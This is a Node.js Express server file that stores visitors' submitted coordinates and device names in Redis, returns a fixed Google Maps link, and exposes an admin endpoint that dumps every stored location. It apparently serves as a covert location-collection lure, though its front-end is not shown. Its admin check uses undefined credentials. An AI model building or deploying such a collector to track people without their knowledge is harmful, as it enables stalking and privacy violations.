import express from "express";
import cors from "cors";
import bodyParser from "body-parser";
import Redis from "ioredis";
import path from "path";
import { fileURLToPath } from "url";

const app = express();
app.use(cors());
app.use(bodyParser.json());

// 🔧 Needed for ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// 🔥 Serve static files
app.use(express.static(path.join(__dirname, "public")));

// ✅ Redis (external, OK for free tier)
const redis = new Redis(process.env.REDIS_URL);

redis.on("connect", () => console.log("✅ Redis connected"));
redis.on("error", (e) => console.error("❌ Redis error", e));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public/web/index.html"));
});


// 📍 Save location
app.post("/save-location", async (req, res) => {
  try {
    const { lat, lng, device } = req.body;

    if (!lat || !lng) {
      return res.status(400).json({ error: "lat/lng missing" });
    }

    const key = `location:${Date.now()}`;

    await redis.hset(key, {
      lat,
      lng,
      device: device || "unknown",
      time: new Date().toISOString(),
    });

    // auto delete after 24h (free-tier friendly)
    await redis.expire(key, 86400);

    res.json({ success: true,link: 'https://maps.app.goo.gl/dsbuMCuogQUALuoa8' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "server error" });
  }
});

app.post("/admin/get-all-data", async (req, res) => {
  try {
    const { id, password } = req.body;

    // 🔐 Auth check
    if (id !== ADMIN_ID || password !== ADMIN_PASS) {
      return res.status(401).json({ error: "Unauthorized" });
    }

    const keys = await redis.keys("location:*");

    const data = [];
    for (const key of keys) {
      const value = await redis.hgetall(key);
      data.push({
        key,
        ...value,
      });
    }

    res.json({
      count: data.length,
      data,
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "server error" });
  }
});


// ✅ Render provides PORT
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
